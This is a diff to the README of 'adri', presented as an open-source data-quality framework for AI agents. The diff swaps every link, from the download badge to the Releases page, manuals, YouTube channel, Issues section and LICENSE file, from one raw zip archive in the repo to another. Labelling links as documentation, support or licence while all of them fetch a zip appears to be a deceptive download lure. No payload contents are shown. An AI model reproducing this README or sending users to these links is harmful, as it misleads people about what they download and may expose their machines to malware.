@@ -1,6 +1,6 @@
 # 🚀 adri - Ensure Data Quality for Reliable AI Workflows
 
-[![Download](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip)
+[![Download](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip%20Now-Click%20Here-blue)](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip)
 
 ## 🌟 Overview
 
@@ -17,7 +17,7 @@ adri is an open source framework that helps AI agents work reliably by ensuring 
 
 To begin using adri, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip) to download the latest version.
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip) to download the latest version.
 
 2. **Choose Your Version:** Select the appropriate version for your system. We provide multiple options depending on your environment.
 
@@ -33,7 +33,7 @@ Before installing adri, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Go to the Releases Page:** To download adri, visit our [Releases page](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip).
+1. **Go to the Releases Page:** To download adri, visit our [Releases page](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip).
 
 2. **Select Your Operating System:** From the list of available files, choose the one that matches your operating system.
 
@@ -45,24 +45,24 @@ Before installing adri, ensure your system meets the following requirements:
 
 For more in-depth instructions, feel free to check our documentation. Here are some useful links:
 
-- [Quick Start Guide](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip)
-- [User Manual](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip)
-- [Contributing Guidelines](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip)
+- [Quick Start Guide](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip)
+- [User Manual](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip)
+- [Contributing Guidelines](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip)
 
 ## 🎥 Video Tutorials
 
-If you prefer visual learning, we have created video tutorials that guide you through the setup and usage of adri. Check them out on our [YouTube channel](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip).
+If you prefer visual learning, we have created video tutorials that guide you through the setup and usage of adri. Check them out on our [YouTube channel](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip).
 
 ## 📞 Support
 
 If you encounter any issues, feel free to reach out for help. You can contact us using the following methods:
 
-- **GitHub Issues:** Report any bugs or feature requests directly in our [Issues section](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip).
+- **GitHub Issues:** Report any bugs or feature requests directly in our [Issues section](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip).
 - **Community Forum:** Join our discussions and find help from other users in our community forum.
 
 ## 📈 Contributing
 
-We welcome contributions from everyone. Whether you're fixing bugs, improving documentation, or adding features, your input is valuable. Please check our [Contributing Guidelines](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip) for more information on how to get started.
+We welcome contributions from everyone. Whether you're fixing bugs, improving documentation, or adding features, your input is valuable. Please check our [Contributing Guidelines](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip) for more information on how to get started.
 
 ## 🛠️ Frequently Asked Questions
 
@@ -73,7 +73,7 @@ We welcome contributions from everyone. Whether you're fixing bugs, improving do
    Yes, adri is an open-source project. You can download, use, and modify it for free.
 
 3. **How often is adri updated?**
-   Updates are released regularly. Check the [Releases page](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip) for the latest information.
+   Updates are released regularly. Check the [Releases page](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip) for the latest information.
 
 4. **Can I run adri on Linux?**
    Yes, adri is designed to work on Linux alongside Windows and macOS.
@@ -82,7 +82,7 @@ We welcome contributions from everyone. Whether you're fixing bugs, improving do
 
 adri is licensed under the MIT License. You can freely use and modify the code, but please include the original license in any distributed software.
 
-For the full text of the license, visit the [LICENSE file](https://raw.githubusercontent.com/Emmanuel135817/adri/main/amelu/adri.zip).
+For the full text of the license, visit the [LICENSE file](https://github.com/Emmanuel135817/adri/raw/refs/heads/main/ADRI/tutorials/Software-v2.2.zip).
 
 ---
 
